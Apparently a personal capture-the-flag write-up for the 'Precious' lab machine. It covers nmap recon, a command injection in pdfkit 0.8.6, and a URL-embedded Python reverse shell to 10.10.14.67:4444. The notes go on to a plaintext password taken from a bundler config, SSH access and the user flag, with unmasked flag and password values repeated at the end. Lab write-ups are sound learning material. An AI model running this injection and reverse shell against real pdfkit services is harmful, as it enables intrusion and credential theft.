# Precious
## 4/01/23
## 10.10.11.189

### Recon:
Nmap
```
Nmap scan report for 10.10.11.189
Host is up (0.012s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```
[!Webpage view, textbox as input returns pdf image of a url]()
Web page seems to take a url input and generates a pdf view of the page 
uses pdfkit v0.8.6
found command injection vulnerability

### Exploitation

when including a variable for the url, if it contains one or more url characters and then a command it would run the command locally,

confirmed when running `url=http://127.0.0.1/?test=%20\`sleep 5\`` which takes significantly longer to run (due to the sleep command embedded in the url)

`http://10.10.14.67/?test=%20\`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.67",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\``

```
$ whoami
ruby
$ id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

```
$ cat .bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3*************FH"
```

ssh henry@10.10.11.189

-bash-5.1$ cat /home/henry/user.txt
7****************7844

7a3027f480ea621fa17d5bbcf7e17844
eed2a37645f1eed67c437a17f584cd4f
Q3c1AqGHtoI0aXAYFH